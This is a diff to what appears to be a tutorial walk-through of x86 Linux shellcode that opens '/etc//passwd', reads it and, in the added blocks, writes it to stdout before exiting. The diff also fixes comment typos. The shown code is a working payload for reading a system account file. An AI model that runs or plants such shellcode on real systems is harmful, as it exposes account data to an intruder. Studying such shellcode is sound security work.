@@ -61,7 +61,7 @@ push   0x64777373     ; push 'dwss' to the stack
 push   0x61702f63     ; push 'ap/c' to the stack
 push   0x74652f2f     ; push 'te//' to the stack
 mov    ebx,esp        ; putting the address and "location" of the file into ebx
-int    0x80           ; sys interupt
+int    0x80           ; sys interrupt
 ```
 
 **Reading the file** 
@@ -72,5 +72,18 @@ mov    al,0x3         ; using the (sys_read) sycall
 xor    edx,edx
 mov    dx,0xfff
 inc    edx
-int    0x80           ; sys interupt
+int    0x80           ; sys interrupt
+```
+
+```asembly
+xchg   eax,edx
+xor    eax,eax
+mov    al,0x4
+mov    bl,0x1
+int    0x80
+```
+
+```assembly
+xchg  eax,ebx
+int   0x80          ; sys interrupt
 ```
